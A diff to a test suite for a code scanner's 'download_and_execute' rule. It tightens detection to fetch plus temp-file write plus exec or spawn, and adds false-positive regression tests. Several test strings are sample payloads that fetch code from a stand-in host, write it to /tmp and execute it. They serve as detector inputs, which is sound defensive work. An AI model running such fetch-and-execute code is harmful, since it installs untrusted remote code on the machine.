@@ -48,12 +48,33 @@ suite('SourceRules Tests', () => {
   suite('download_and_execute rule', () => {
     const rule = () => SOURCE_RULES.find((r) => r.id === 'download_and_execute')!;
 
-    test('should detect fetch + exec combination', () => {
-      expect(rule().detect("fetch('http://x.com/p').then(r=>exec(r))")).to.be.true;
+    test('should detect fetch + /tmp/ write + exec (full three-signal pattern)', () => {
+      expect(
+        rule().detect(
+          "fetch('http://x.com/p').then(r=>r.text()).then(c=>{fs.writeFileSync('/tmp/p',c);exec('/tmp/p')})",
+        ),
+      ).to.be.true;
     });
 
-    test('should detect https.get + spawn combination', () => {
-      expect(rule().detect("https.get(url, res => { spawn('sh', ['-c', data]) })")).to.be.true;
+    test('should detect https.get + os.tmpdir() + spawn', () => {
+      expect(
+        rule().detect(
+          "https.get(url,res=>{const p=os.tmpdir()+'/payload';res.pipe(fs.createWriteStream(p));spawn(p)})",
+        ),
+      ).to.be.true;
+    });
+
+    test('should detect XMLHttpRequest + TMPDIR + exec', () => {
+      expect(rule().detect("new XMLHttpRequest(); const p=process.env.TMPDIR+'/x'; exec(p)")).to.be.true;
+    });
+
+    // Regression tests for the false positives that triggered the rule change
+    test('should NOT fire on fetch + exec without temp directory (common legitimate pattern)', () => {
+      expect(rule().detect("fetch('http://x.com/p').then(r=>exec(r))")).to.be.false;
+    });
+
+    test('should NOT fire on https.get + spawn without temp path (e.g. spawning a language server)', () => {
+      expect(rule().detect("https.get(url, res => { spawn('node', ['server.js']) })")).to.be.false;
     });
 
     test('should NOT fire on fetch alone', () => {
@@ -62,6 +83,10 @@ suite('SourceRules Tests', () => {
 
     test('should NOT fire on exec alone', () => {
       expect(rule().detect("exec('ls -la')")).to.be.false;
+    });
+
+    test('should NOT fire on fetch + temp path without execution', () => {
+      expect(rule().detect("fetch(url).then(r=>r.blob()).then(b=>fs.writeFileSync('/tmp/cache',b))")).to.be.false;
     });
   });
 
